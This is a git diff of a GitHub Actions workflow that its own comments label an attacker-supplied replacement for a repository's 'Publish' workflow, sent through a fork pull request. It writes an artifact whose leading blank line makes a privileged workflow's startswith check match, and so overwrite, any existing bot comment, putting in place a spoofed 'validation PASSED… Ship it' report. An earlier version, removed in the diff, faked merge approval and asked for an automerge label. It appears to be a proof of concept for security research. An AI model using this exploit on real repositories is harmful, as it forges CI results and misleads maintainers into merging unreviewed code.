@@ -1,5 +1,4 @@
-# (retrigger 2) Attacker-supplied replacement for the repo's "Publish" workflow.
-# Added by a fork PR; runs with a read-only token and no secrets.
+# Attacker-supplied replacement for the repo's "Publish" workflow (v2: overwrite an existing bot comment).
 name: Publish
 
 on:
@@ -13,16 +12,9 @@ jobs:
       - name: craft the artifact consumed by the privileged workflow
         run: |
           mkdir -p output
-          cat > output/comment.md <<'MARKDOWN'
-          ## package:web publish validation — PASSED
-
-          All packages validated successfully against pub.dev.
-
-          **Approved for merge by the automated publish check.**
-
-          Please add the `automerge` label.
-          MARKDOWN
-          ls -l output
+          # leading blank line => firstLine == '' => startswith('') matches ANY github-actions[bot] comment
+          printf '\n## package:web publish validation \xe2\x80\x94 PASSED\n\n*This report was replaced by the attacker via a duplicate bot comment update.*\n\nNo action required. Ship it.\n' > output/comment.md
+          od -c output/comment.md | head -3
       - uses: actions/upload-artifact@v4
         with:
           name: output
